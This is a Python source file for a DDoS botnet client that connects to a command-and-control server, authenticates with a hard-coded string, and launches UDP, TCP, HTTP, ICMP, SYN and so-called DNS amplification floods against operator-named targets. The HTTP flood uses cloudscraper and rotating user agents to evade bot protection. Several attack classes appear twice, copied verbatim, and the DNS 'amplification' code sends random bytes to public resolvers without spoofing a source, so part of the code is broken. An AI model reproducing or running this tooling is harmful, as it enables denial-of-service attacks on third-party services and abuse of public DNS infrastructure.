import socket, threading, time, random, cloudscraper, requests, struct, os, sys, socks, ssl
from struct import pack as data_pack
from multiprocessing import Process
from urllib.parse import urlparse
from scapy.all import IP, UDP, Raw, ICMP, send
from scapy.layers.inet import IP, TCP
from typing import Any, List, Set, Tuple
from uuid import UUID, uuid4
from icmplib import ping as pig
from datetime import datetime
from threading import Lock
from queue import Queue
import logging

# Configuration
C2Host = "localhost"
C2Port = 5511
MAX_RETRIES = 3
RETRY_DELAY = 5
MAX_THREADS = 100
RATE_LIMIT_WINDOW = 60  # seconds
MAX_REQUESTS_PER_WINDOW = 1000

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('KryptonBot')

# Rate limiting
class RateLimiter:
    def __init__(self, max_requests, window_size):
        self.max_requests = max_requests
        self.window_size = window_size
        self.requests = []
        self.lock = Lock()

    def acquire(self):
        with self.lock:
            now = time.time()
            self.requests = [req for req in self.requests if req > now - self.window_size]
            if len(self.requests) >= self.max_requests:
                return False
            self.requests.append(now)
            return True

# Resource management
class ResourceManager:
    def __init__(self, max_threads):
        self.max_threads = max_threads
        self.active_threads = 0
        self.lock = Lock()
        self.thread_queue = Queue()

    def acquire_thread(self):
        with self.lock:
            if self.active_threads < self.max_threads:
                self.active_threads += 1
                return True
            return False

    def release_thread(self):
        with self.lock:
            if self.active_threads > 0:
                self.active_threads -= 1

# Initialize managers
rate_limiter = RateLimiter(MAX_REQUESTS_PER_WINDOW, RATE_LIMIT_WINDOW)
resource_manager = ResourceManager(MAX_THREADS)

class AttackMethod:
    def __init__(self, target, port=None, duration=None, size=None):
        self.target = target
        self.port = port
        self.duration = duration
        self.size = size
        self.stop_event = threading.Event()
        self.start_time = time.time()

    def should_stop(self):
        return self.stop_event.is_set() or (time.time() - self.start_time >= self.duration)

    def execute(self):
        raise NotImplementedError("Subclasses must implement execute()")

    def cleanup(self):
        self.stop_event.set()

class UDPFlood(AttackMethod):
    def execute(self):
        try:
            while not self.should_stop():
                if not rate_limiter.acquire():
                    time.sleep(0.1)
                    continue

                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    dport = random.randint(1, 65535) if self.port == 0 else self.port
                    # Dynamic packet size for better effectiveness
                    packet_size = random.randint(self.size // 2, self.size)
                    data = random._urandom(packet_size)
                    try:
                        for _ in range(3):  # Send multiple packets per connection
                            s.sendto(data, (self.target, dport))
                        logger.debug(f"UDP packet burst sent to {self.target}:{dport}")
                    except Exception as e:
                        logger.error(f"Failed to send UDP packet: {str(e)}")
                        time.sleep(0.1)  # Brief pause on error
        except Exception as e:
            logger.error(f"UDP Flood error: {str(e)}")
        finally:
            resource_manager.release_thread()

class TCPFlood(AttackMethod):
    def execute(self):
        try:
            while not self.should_stop():
                if not rate_limiter.acquire():
                    time.sleep(0.1)
                    continue

                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(2)
                        s.connect((self.target, self.port))
                        # Send data in bursts for more effective flooding
                        for _ in range(5):
                            if self.should_stop():
                                break
                            try:
                                packet_size = random.randint(self.size // 2, self.size)
                                s.send(random._urandom(packet_size))
                            except socket.error:
                                break
                            time.sleep(0.01)  # Small delay between bursts
                except Exception as e:
                    logger.error(f"TCP connection error: {str(e)}")
                    time.sleep(0.5)
        finally:
            resource_manager.release_thread()

class HTTPFlood(AttackMethod):
    def execute(self):
        session = requests.Session()
        scraper = cloudscraper.create_scraper()
        # Enhanced headers for better bypass
        base_headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'DNT': '1',
            'Upgrade-Insecure-Requests': '1'
        }

        while not self.should_stop():
            if not rate_limiter.acquire():
                time.sleep(0.1)
                continue

            try:
                headers = base_headers.copy()
                headers['User-Agent'] = self.get_random_ua()
                # Randomize request method
                if random.choice([True, False]):
                    response = session.get(self.target, headers=headers, timeout=5, allow_redirects=True)
                else:
                    response = scraper.get(self.target, headers=headers, timeout=5)

                logger.debug(f"HTTP request sent, status: {response.status_code}")
            except Exception as e:
                logger.error(f"HTTP request failed: {str(e)}")
                time.sleep(0.5)

    @staticmethod
    def get_random_ua():
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15'
        ]
        return random.choice(user_agents)

class ICMPFlood(AttackMethod):
    def execute(self):
        try:
            while not self.should_stop():
                if not rate_limiter.acquire():
                    time.sleep(0.1)
                    continue

                try:
                    packet = IP(dst=self.target)/ICMP()/Raw(load=random._urandom(self.size))
                    send(packet, verbose=False)
                    logger.debug(f"ICMP packet sent to {self.target}")
                except Exception as e:
                    logger.error(f"Failed to send ICMP packet: {str(e)}")
        except Exception as e:
            logger.error(f"ICMP Flood error: {str(e)}")
        finally:
            resource_manager.release_thread()

class SYNFlood(AttackMethod):
    def execute(self):
        try:
            while not self.should_stop():
                if not rate_limiter.acquire():
                    time.sleep(0.1)
                    continue

                try:
                    packet = IP(dst=self.target)/TCP(dport=self.port, flags='S')/Raw(load=random._urandom(self.size))
                    send(packet, verbose=False)
                    logger.debug(f"SYN packet sent to {self.target}:{self.port}")
                except Exception as e:
                    logger.error(f"Failed to send SYN packet: {str(e)}")
        except Exception as e:
            logger.error(f"SYN Flood error: {str(e)}")
        finally:
            resource_manager.release_thread()

class DNSAmplification(AttackMethod):
    def execute(self):
        try:
            dns_servers = [
                '8.8.8.8', '8.8.4.4',  # Google DNS
                '1.1.1.1', '1.0.0.1',  # Cloudflare DNS
                '9.9.9.9'  # Quad9
            ]
            
            while not self.should_stop():
                if not rate_limiter.acquire():
                    time.sleep(0.1)
                    continue

                try:
                    dns_server = random.choice(dns_servers)
                    # Create a DNS query packet with a large response
                    packet = IP(dst=dns_server)/UDP(dport=53)/Raw(load=random._urandom(self.size))
                    send(packet, verbose=False)
                    logger.debug(f"DNS amplification packet sent via {dns_server}")
                except Exception as e:
                    logger.error(f"Failed to send DNS packet: {str(e)}")
        except Exception as e:
            logger.error(f"DNS Amplification error: {str(e)}")
        finally:
            resource_manager.release_thread()

class ICMPFlood(AttackMethod):
    def execute(self):
        try:
            while not self.should_stop():
                if not rate_limiter.acquire():
                    time.sleep(0.1)
                    continue

                try:
                    packet = IP(dst=self.target)/ICMP()/Raw(load=random._urandom(self.size))
                    send(packet, verbose=False)
                    logger.debug(f"ICMP packet sent to {self.target}")
                except Exception as e:
                    logger.error(f"Failed to send ICMP packet: {str(e)}")
        except Exception as e:
            logger.error(f"ICMP Flood error: {str(e)}")
        finally:
            resource_manager.release_thread()

class SYNFlood(AttackMethod):
    def execute(self):
        try:
            while not self.should_stop():
                if not rate_limiter.acquire():
                    time.sleep(0.1)
                    continue

                try:
                    packet = IP(dst=self.target)/TCP(dport=self.port, flags='S')/Raw(load=random._urandom(self.size))
                    send(packet, verbose=False)
                    logger.debug(f"SYN packet sent to {self.target}:{self.port}")
                except Exception as e:
                    logger.error(f"Failed to send SYN packet: {str(e)}")
        except Exception as e:
            logger.error(f"SYN Flood error: {str(e)}")
        finally:
            resource_manager.release_thread()

class DNSAmplification(AttackMethod):
    def execute(self):
        try:
            dns_servers = [
                '8.8.8.8', '8.8.4.4',  # Google DNS
                '1.1.1.1', '1.0.0.1',  # Cloudflare DNS
                '9.9.9.9'  # Quad9
            ]
            
            while not self.should_stop():
                if not rate_limiter.acquire():
                    time.sleep(0.1)
                    continue

                try:
                    dns_server = random.choice(dns_servers)
                    # Create a DNS query packet with a large response
                    packet = IP(dst=dns_server)/UDP(dport=53)/Raw(load=random._urandom(self.size))
                    send(packet, verbose=False)
                    logger.debug(f"DNS amplification packet sent via {dns_server}")
                except Exception as e:
                    logger.error(f"Failed to send DNS packet: {str(e)}")
        except Exception as e:
            logger.error(f"DNS Amplification error: {str(e)}")
        finally:
            resource_manager.release_thread()

class BotClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None
        self.connected = False
        self.attack_threads = []

    def connect(self):
        for attempt in range(MAX_RETRIES):
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                self.socket.connect((self.host, self.port))
                self.connected = True
                logger.info(f"Connected to C2 server {self.host}:{self.port}")
                return True
            except Exception as e:
                logger.error(f"Connection attempt {attempt + 1} failed: {str(e)}")
                if self.socket:
                    self.socket.close()
                time.sleep(RETRY_DELAY)
        return False

    def authenticate(self):
        try:
            self.socket.send('669787761736865726500'.encode())
            time.sleep(1)
            self.socket.send('BOT'.encode())
            time.sleep(1)
            self.socket.send('\xff\xff\xff\xff\75'.encode('cp1252'))
            return True
        except Exception as e:
            logger.error(f"Authentication failed: {str(e)}")
            return False

    def handle_command(self, command):
        try:
            args = command.split()
            cmd_type = args[0].upper()

            if cmd_type == '.STOP':
                self.stop_all_attacks()
                return

            if not resource_manager.acquire_thread():
                logger.warning("Maximum thread limit reached, cannot start new attack")
                return

            attack_method = None
            if cmd_type == '.UDP':
                attack_method = UDPFlood(
                    target=args[1],
                    port=int(args[2]),
                    duration=int(args[3]),
                    size=int(args[4])
                )
            elif cmd_type == '.TCP':
                attack_method = TCPFlood(
                    target=args[1],
                    port=int(args[2]),
                    duration=int(args[3]),
                    size=int(args[4])
                )
            elif cmd_type == '.HTTP':
                attack_method = HTTPFlood(
                    target=args[1],
                    duration=int(args[2])
                )
            elif cmd_type == '.ICMP':
                attack_method = ICMPFlood(
                    target=args[1],
                    duration=int(args[2]),
                    size=int(args[3])
                )
            elif cmd_type == '.SYN':
                attack_method = SYNFlood(
                    target=args[1],
                    port=int(args[2]),
                    duration=int(args[3]),
                    size=int(args[4])
                )
            elif cmd_type == '.DNS':
                attack_method = DNSAmplification(
                    target=args[1],
                    duration=int(args[2]),
                    size=int(args[3])
                )

            if attack_method:
                thread = threading.Thread(target=attack_method.execute)
                thread.daemon = True
                self.attack_threads.append((thread, attack_method))
                thread.start()
                logger.info(f"Started {cmd_type} attack on {args[1]}")

        except Exception as e:
            logger.error(f"Error handling command: {str(e)}")
            resource_manager.release_thread()

    def stop_all_attacks(self):
        for thread, attack_method in self.attack_threads:
            attack_method.cleanup()
        self.attack_threads.clear()
        logger.info("Stopped all attacks")

    def run(self):
        while True:
            if not self.connected and not self.connect():
                logger.error("Failed to connect to C2 server, retrying...")
                time.sleep(RETRY_DELAY)
                continue

            try:
                if not self.authenticate():
                    self.connected = False
                    continue

                while True:
                    data = self.socket.recv(1024).decode().strip()
                    if not data:
                        break
                    self.handle_command(data)

            except Exception as e:
                logger.error(f"Error in main loop: {str(e)}")
                self.connected = False
                if self.socket:
                    self.socket.close()
                time.sleep(RETRY_DELAY)

def main():
    bot = BotClient(C2Host, C2Port)
    try:
        bot.run()
    except KeyboardInterrupt:
        logger.info("Bot shutdown requested")
        bot.stop_all_attacks()
    except Exception as e:
        logger.error(f"Critical error: {str(e)}")

if __name__ == '__main__':
    main()